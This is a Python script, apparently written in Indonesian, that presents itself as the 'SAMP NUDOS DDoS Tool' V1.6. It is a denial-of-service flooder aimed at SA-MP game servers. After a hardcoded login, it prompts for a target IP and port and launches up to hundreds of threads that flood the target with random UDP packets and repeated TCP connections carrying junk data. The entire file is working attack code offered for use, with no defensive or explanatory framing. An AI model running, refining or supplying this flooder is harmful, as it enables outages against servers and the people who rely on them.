import random
import socket
import threading
import time
import os
import sys

os.system("clear")

print("\033[35m")
print("""
	  AUTHOR TOOLS : SAMP NUDOS
	╔═╗╔═╗╔╦╗╔═╗   ╔╗╔╦ ╦╔╦╗╔═╗╔═╗
	╚═╗╠═╣║║║╠═╝───║║║║ ║ ║║║ ║╚═╗
	╚═╝╩ ╩╩ ╩╩     ╝╚╝╚═╝═╩╝╚═╝╚═╝ V 1.6 FIXED
""")
print("\033[0m")

# Login sederhana
attemps = 0
while attemps < 3:
    username = input('Enter your username: ')
    password = input('Enter your password: ')
    if username == 'NUDOS' and password == 'NUDOS':
        print('\033[32mYou have successfully logged in. Welcome to NUDOS!!\033[0m')
        break
    else:
        print('\033[31mIncorrect credentials.\033[0m')
        attemps += 1
else:
    print("Too many failed attempts. Exiting.")
    sys.exit()

os.system("clear")

print("\033[35mSAMP NUDOS DDoS Tool - FIXED & UPGRADED 2026\033[0m\n")

ip = input("Target IP      : ")
port = int(input("Target Port    : ") or 7777)
choice = input("Use Full Attack (y/n): ").lower()
times = int(input("Packets per thread : ") or 100)
threads = int(input("Number of Threads  : ") or 200)

print(f"\n\033[31mATTACKING {ip}:{port} with {threads} threads...\033[0m")
print("Press Ctrl+C to stop.\n")

def udp_flood():
    data = random._urandom(random.randint(512, 2048))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(data, (ip, port))
            print("\033[32m[UDP] Packet Sent!\033[0m", end="\r")
        except:
            pass
        time.sleep(0.001)

def tcp_flood():
    data = random._urandom(random.randint(512, 1024))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((ip, port))
            for _ in range(times):
                s.send(data)
            print("\033[33m[TCP] Connection Flood Sent!\033[0m", end="\r")
            s.close()
        except:
            pass
        time.sleep(0.01)

def run():
    while True:
        try:
            if random.choice([True, False]):
                udp_flood()
            else:
                tcp_flood()
        except:
            pass

# Mulai attack
try:
    for _ in range(threads):
        if choice == 'y':
            # Full attack: UDP + TCP
            t1 = threading.Thread(target=udp_flood, daemon=True)
            t2 = threading.Thread(target=tcp_flood, daemon=True)
            t1.start()
            t2.start()
        else:
            # UDP only (lebih ringan)
            t = threading.Thread(target=udp_flood, daemon=True)
            t.start()
        
        time.sleep(0.005)  # stagger threads

    print("\033[31mAttack is running... Press Ctrl+C to stop.\033[0m")
    while True:
        time.sleep(10)

except KeyboardInterrupt:
    print("\n\n\033[31mAttack stopped by user.\033[0m")
except Exception as e:
    print(f"\nError: {e}")
